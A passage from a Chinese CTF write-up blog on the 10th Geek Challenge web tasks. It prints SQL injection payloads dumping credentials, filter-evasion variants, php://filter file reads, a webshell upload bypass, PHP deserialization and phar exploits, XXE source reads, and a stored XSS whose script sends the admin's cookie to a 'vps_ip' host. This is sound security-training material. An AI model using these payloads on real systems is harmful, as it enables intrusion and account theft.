<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(schema_name)+from+information_schema.schemata%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191101203821862.png" alt="image-20191101203821862"></p>
<p>先关注geek数据库，查表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(table_name)+from+information_schema.tables+where+table_schema%3d&apos;geek&apos;%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191101204140891.png" alt="image-20191101204140891"></p>
<p>查l0ve1ysq1表的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(column_name)+from+information_schema.columns+where+table_schema%3d&apos;geek&apos;+and+table_name%3d&apos;l0ve1ysq1&apos;%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191101204909589.png" alt="image-20191101204909589"></p>
<p>获取数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(id,username,password)+from+geek.l0ve1ysq1+%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191101213948365.png" alt="image-20191101213948365"></p>
<h2 id="性感黄阿姨，在线聊天-听说她有很多小秘密和表情包哦，当然也有你们最想要的flag！"><a href="#性感黄阿姨，在线聊天-听说她有很多小秘密和表情包哦，当然也有你们最想要的flag！" class="headerlink" title="性感黄阿姨，在线聊天:听说她有很多小秘密和表情包哦，当然也有你们最想要的flag！"></a>性感黄阿姨，在线聊天:听说她有很多小秘密和表情包哦，当然也有你们最想要的flag！</h2><p>bp抓包</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191031113746614.png" alt="image-20191031113746614"></p>
<p>尝试把guest改成admin</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191031114019083.png" alt="image-20191031114019083"></p>
<p>提示我们要绕过这个判断</p>
<p>两个等号，第一时间想到的是php弱类型</p>
<p>利用字符串和数字的比较弱点</p>
<p>md5加密肯定是个字符串，如果第一个字符是字母转化为数字则为0，如果前两个字符是“1w”，那么转化为数字则为1.</p>
<p>所以我们利用name传输数字，爆破md5($flag)前面的数字即可绕过。</p>
<p>在json中，“name”:”0”是字符串，”name”:0 是数字</p>
<p>配置测试器</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191031115415135.png" alt="image-20191031115415135"></p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191031115443975.png" alt="image-20191031115443975"></p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191031115642982.png" alt="image-20191031115642982"></p>
<p>改成<a href="https://4o4notfound.org/index.php/archives/29/" target="_blank" rel="noopener">xml</a>形式，Connect-Type改成xml</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191031122255387.png" alt="image-20191031122255387"></p>
<p>利用PHP<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">伪协议</a>和base64加密读取文件内容</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191031124114147.png" alt="image-20191031124114147"></p>
<p>base64解码得到flag</p>
<h2 id="李三的代码审计笔记第二页"><a href="#李三的代码审计笔记第二页" class="headerlink" title="李三的代码审计笔记第二页"></a>李三的代码审计笔记第二页</h2><p>根据题目提示，下载源码</p>
<h2 id="Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！"><a href="#Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！" class="headerlink" title="Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！"></a>Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！</h2><p>经过测试一些关键字被过滤了，但通过双写可以绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=-1&apos; oorrder bbyy 4-- &amp;password=123 //判断字段</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(schema_name)+frfromom+infoorrmation_schema.schemata%23&amp;password=123 //查数据库</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(table_name)+frfromom+infoorrmation_schema.tables+whwhereere+table_schema%3d&apos;geek&apos;%23&amp;password=123  //查表</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(column_name)+frfromom+infoorrmation_schema.columns+whwhereere+table_schema%3d&apos;geek&apos;+aandnd+table_name%3d&apos;b4bsql&apos;%23&amp;password=123 //查字段</span><br><span class="line"></span><br><span class="line">username=1%27union+select+1,2,group_concat(id,username,password)+from+geek.l0ve1ysq1+%23&amp;password=123   //获取数据</span><br></pre></td></tr></table></figure>

<h2 id="神秘的三叶草"><a href="#神秘的三叶草" class="headerlink" title="神秘的三叶草"></a>神秘的三叶草</h2><p><img src="/2019/10/第十届极客大挑战Write-up/image-20191029215131113.png" alt="image-20191029215131113"></p>
<p>查看源码，发现Secret.php</p>
<p>打开Secret.php</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191029215545399.png" alt="image-20191029215545399"></p>
<p>直接BP抓包，修改Referer头</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191029220046452.png" alt="image-20191029220046452"></p>
<p>提示使用Syclover浏览器</p>
<p>修改UA头</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191029220217949.png" alt="image-20191029220217949"></p>
<p>接着提示只能本地读取</p>
<p>修改XFF头</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191029220337766.png" alt="image-20191029220337766"></p>
<p>得到flag</p>
<h2 id="Eval-evil-code-Lamber是个老实人，他会执行你给他的代码。"><a href="#Eval-evil-code-Lamber是个老实人，他会执行你给他的代码。" class="headerlink" title="Eval evil code: Lamber是个老实人，他会执行你给他的代码。"></a>Eval evil code: Lamber是个老实人，他会执行你给他的代码。</h2><p>这里有两个限制</p>
<p>一、提交的恶意代码不能带有参数，二、输入正确的验证码</p>
<p>第二个好解决，直接用md5<a href="https://0xcreed.github.io/2019/11/04/Md5Crack/" target="_blank" rel="noopener">碰撞脚本</a></p>
<p>第一个就要利用PHP的丰富的内置函数来构造参数。</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191111224322216.png" alt="image-20191111224322216"></p>
<p>接着读取readflag.php</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191111224528382.png" alt="image-20191111224528382"></p>
<p>参考skysec的<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">文章</a></p>
<h2 id="Jiang‘s-Secret-我在那放了一个秘密！"><a href="#Jiang‘s-Secret-我在那放了一个秘密！" class="headerlink" title="Jiang‘s Secret:我在那放了一个秘密！"></a>Jiang‘s Secret:我在那放了一个秘密！</h2><p>打开主页</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191029231444787.png" alt="image-20191029231444787"></p>
<p>查看源码</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191029231426639.png" alt="image-20191029231426639"></p>
<p>访问Archive_room.php</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191029231626206.png" alt="image-20191029231626206"></p>
<p>点击SECRET</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191029231659829.png" alt="image-20191029231659829"></p>
<p>尝试BP抓包</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191029231743833.png" alt="image-20191029231743833"></p>
<p>访问secr3t.php</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191029231920584.png" alt="image-20191029231920584"></p>
<p>简单的代码审计</p>
<p>直接file=flag.php</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191029232108090.png" alt="image-20191029232108090"></p>
<p>无法直接读取flag.php文件</p>
<p>利用php伪协议</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191029232338502.png" alt="image-20191029232338502"></p>
<p>base64解码</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191029232357758.png" alt="image-20191029232357758"></p>
<h2 id="Hardsql"><a href="#Hardsql" class="headerlink" title="Hardsql"></a>Hardsql</h2><h2 id="你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ"><a href="#你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ" class="headerlink" title="你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ=="></a>你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ==</h2><p>上传正常的图片</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191030232940824.png" alt="image-20191030232940824"></p>
<p>Not image！</p>
<p>尝试修改Content-Type</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191030233157391.png" alt="image-20191030233157391"></p>
<p>上传成功，但并没有返回文件路径</p>
<p>盲猜一波upload</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191030233348553.png" alt="image-20191030233348553"></p>
<p>正确</p>
<p>尝试上传一句话木马</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191030233555540.png" alt="image-20191030233555540"></p>
<p>尝试改后缀</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191030233648512.png" alt="image-20191030233648512"></p>
<p>phtml可绕过 但不能出现&lt;?</p>
<p>利用  <code>&lt;script  language=&quot;php&quot;&gt;</code> 绕过</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191030233844611.png" alt="image-20191030233844611"></p>
<p>上传成功</p>
<p>菜刀 连上</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191030234008757.png" alt="image-20191030234008757"></p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191030234111964.png" alt="image-20191030234111964"></p>
<h2 id="Leixiao’s-blog-你会盗号吗？？"><a href="#Leixiao’s-blog-你会盗号吗？？" class="headerlink" title="Leixiao’s blog:  你会盗号吗？？"></a>Leixiao’s blog:  你会盗号吗？？</h2><p>这道题是直接根据wp复现的，对XSS没有实战过，所以没写出来。</p>
<p>XSS离不开输入框，所以BP抓包，修改各个参数的值，发现密保问题是可控的。所以就构造一个Script的语句，插入到数据库中，之后在重置密码页面，这个Script语句会插入到页面中。如果管理员访问了这个页面，那么我们就能得到管理员的cookie，从而以管理员身份登录。</p>
<p>先注册一个用户，并将密保问题修改成Script语句 <code>&quot;&gt;&lt;script src=//0x12345678/1.js&gt;</code></p>
<p>1.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.location=<span class="string">'http://vps_ip/cookie'</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191117232732259.png" alt="image-20191117232732259"></p>
<p>我们访问dcz123用户的重置密码页面</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191117233119467.png" alt="image-20191117233119467"></p>
<p>发现成功跳转了</p>
<p>接下来把</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://148.70.59.198:41258/forget.php?username=dcz123</span><br></pre></td></tr></table></figure>

<p>发给report</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191117233239962.png" alt="image-20191117233239962"></p>
<p>管理员访问后，就能在访问日志中得到管理员的cookie了</p>
<h2 id="反序列化1-0-socre10000拿到flag"><a href="#反序列化1-0-socre10000拿到flag" class="headerlink" title="反序列化1.0 : socre10000拿到flag"></a>反序列化1.0 : socre10000拿到flag</h2><p>F12查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $score = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__destruct working"</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;score==<span class="number">10000</span>) &#123;</span><br><span class="line">            $flag = <span class="string">"******************"</span>;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$exp = $_GET[<span class="string">'exp'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">unserialize($exp);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用反序列化漏洞，使score的值改成10000获得flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $score = <span class="number">10000</span>;</span><br><span class="line">&#125;</span><br><span class="line">    $Student = <span class="keyword">new</span> Student();</span><br><span class="line">    <span class="keyword">echo</span> serialize($Student); </span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//O:7:"Student":1:&#123;s:5:"score";i:10000;&#125;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">148.70</span>.<span class="number">59.198</span>:<span class="number">42374</span>/?<span class="keyword">exp</span>=O:<span class="number">7</span>:%22Student%22:<span class="number">1</span>:&#123;<span class="keyword">s</span>:<span class="number">5</span>:%22score%22;i:<span class="number">10000</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191103221650185.png" alt="image-20191103221650185"></p>
<p><a href="https://www.freebuf.com/news/172507.html" target="_blank" rel="noopener">参考文章1</a></p>
<h2 id="又来一只猫-我家猫名字叫php"><a href="#又来一只猫-我家猫名字叫php" class="headerlink" title="又来一只猫: 我家猫名字叫php"></a>又来一只猫: 我家猫名字叫php</h2><p><img src="/2019/10/第十届极客大挑战Write-up/image-20191106232809806.png" alt="image-20191106232809806"></p>
<p>推测应该存在备份文件，盲猜 <code>www.zip</code></p>
<p>下载后解压，index.php中接受select参数并反序列化。</p>
<p>查看class.php</p>
<p>根据 <code>__destruct()</code>函数 反序列化要使$username=admin,$password=100.</p>
<p>但有个问题要绕过 <code>__wakeup()</code> ,这里可以利用 CVE-2016-7124漏洞，<strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong> </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'admin'</span>;    </span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'100'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$s=<span class="keyword">new</span> Name();</span><br><span class="line">var_dump(serialize($s));</span><br><span class="line">$payload=<span class="string">"O:4:\"Name\":3&#123;s:14:\"\000Name\000username\";s:5:\"admin\";s:14:\"\000Name\000password\";s:3:\"100\";&#125;"</span>; <span class="comment">//2-&gt;3</span></span><br><span class="line">var_dump(urlencode($payload));<span class="comment">//O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最终payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://118.25.14.40:8109/?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191106234145206.png" alt="image-20191106234145206"></p>
<p><a href="https://xz.aliyun.com/t/3674#toc-11" target="_blank" rel="noopener">参考文章1</a></p>
<p><a href="https://xz.aliyun.com/t/6454#toc-18" target="_blank" rel="noopener">参考文章2</a></p>
<h2 id="你有初恋吗：你变心了吗"><a href="#你有初恋吗：你变心了吗" class="headerlink" title="你有初恋吗：你变心了吗"></a>你有初恋吗：你变心了吗</h2><p>打开题目<a href="http://cxc.design/53a5734d6c99f89a/" target="_blank" rel="noopener">链接</a></p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191106163009923.png" alt="image-20191106163009923"></p>
<p>F12查看源码</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191106163100753.png" alt="image-20191106163100753"></p>
<p>明显是hash扩展字节攻击</p>
<p>利用BP抓包</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191106163553918.png" alt="image-20191106163553918"></p>
<p>得到Heart的值：<code>6a1ce5f4dc83320710006a786ac82c17</code></p>
<p>利用hashpump得到lover</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191106163932674.png" alt="image-20191106163932674"></p>
<p>将得到的字符串进行url编码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line">$str=<span class="string">"syclover\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00nb"</span>;</span><br><span class="line">var_dump(urlencode($str));<span class="comment">//syclover%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%B8%00%00%00%00%00%00%00nb</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将Heart的值修改成<code>2399f812e1a15732dcaadef365b71c19</code> 提交lover</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191106164815760.png" alt="image-20191106164815760"></p>
<p>后面看了LiM的文章，枯了。</p>
<p>双URL编码绕过，直接POST提交  <code>lover=syclove%2572</code> 得到flag。</p>
<p>思路太局限了。。。</p>
<p><a href="https://www.freebuf.com/articles/web/31756.html" target="_blank" rel="noopener">参考文章1</a></p>
<p><a href="https://www.freebuf.com/articles/database/164019.html" target="_blank" rel="noopener">参考文章2</a></p>
<h2 id="Finalsql"><a href="#Finalsql" class="headerlink" title="Finalsql"></a>Finalsql</h2><h2 id="你读懂潇文清的网站了吗-xxe"><a href="#你读懂潇文清的网站了吗-xxe" class="headerlink" title="你读懂潇文清的网站了吗 : xxe"></a>你读懂潇文清的网站了吗 : xxe</h2><p>都已经提示xxe了</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191112171229906.png" alt="image-20191112171229906"></p>
<p>利用php伪协议读取源码</p>
<p>index.php中的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./config.php"</span>);</span><br><span class="line">date_default_timezone_set(<span class="string">"PRC"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $data= $_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/flag|decode|file|zlib|input|data|http|ftp|#/i"</span>,$data))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"no!!!you cant read flag right here!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $xml = simplexml_load_string($data,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>($xml);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现包含了config文件</p>
<p>接着读</p>
<p>config.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">true<span class="keyword">public</span>  $filetype;</span><br><span class="line">true<span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"wake up "</span>;</span><br><span class="line">        var_dump(readfile(<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($filetype,$filename)</span></span>&#123;</span><br><span class="line">    	$filename = $filename;</span><br><span class="line">    	$filetype = $filetype;</span><br><span class="line"></span><br><span class="line">    	<span class="keyword">if</span> (($filetype!=<span class="string">"image/jpg"</span>)&amp;&amp;(substr($filename, strrpos($filename, <span class="string">'.'</span>)+<span class="number">1</span>))!= <span class="string">'jpg'</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"只允许上传jpg格式文件"</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($filetemp)</span></span>&#123;</span><br><span class="line">    	    $target_file = getcwd().<span class="string">"/uploads/"</span>.md5($filetemp+$_SERVER[<span class="string">'HTTP_REFERER'</span>]).<span class="string">".jpg"</span>;</span><br><span class="line">true    $handle = fopen($filetemp, <span class="string">"r"</span>);</span><br><span class="line">    $content = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">while</span>(!feof($handle))&#123;</span><br><span class="line">        $content .= fread($handle, <span class="number">8080</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/xml|#|SYSTEM|DOCTYPE|fliter|uploads|www/i"</span>,$content))&#123;</span><br><span class="line">true<span class="keyword">echo</span> <span class="string">"Invalid file!!!!"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">    fclose($handle);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($filetemp, $target_file)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"your file is here:"</span>.$target_file;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但index.php并没有把File类实例化。File类中有上传功能的函数，就猜了下upload.php 。还真有。。。</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191112234259635.png" alt="image-20191112234259635"></p>
<p>读取upload.php的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"></span><br><span class="line">$filename = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">$filetype = $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">$filetemp = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line"></span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$file-&gt;check($filetype,$filename);</span><br><span class="line">$file-&gt;upload($filetemp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>并没有 <code>unserialize()</code>函数，但根据源码，要触发 <code>__wakeup()</code>函数才能得到flag</p>
<p>这里可以利用<code>phar://</code>协议，触发反序列</p>
<p>exp.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="comment">//生成对应可被利用的对象</span></span><br><span class="line">    $o = <span class="keyword">new</span> File();</span><br><span class="line">    @unlink(<span class="string">"phar.jpg"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.jpg"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"JFIF"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加jpg文件头用以欺骗检测</span></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件  text.txt内容随意</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将文件上传</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191114132547110.png" alt="image-20191114132547110"></p>
<p>利用<code>phar://</code>协议触发序列化</p>
<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191114132652219.png" alt="image-20191114132652219"></p>
<p>解码得到flag</p>
<p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">参考文章1</a></p>
<p><a href="https://xz.aliyun.com/t/3336" target="_blank" rel="noopener">参考文章2</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
</search>
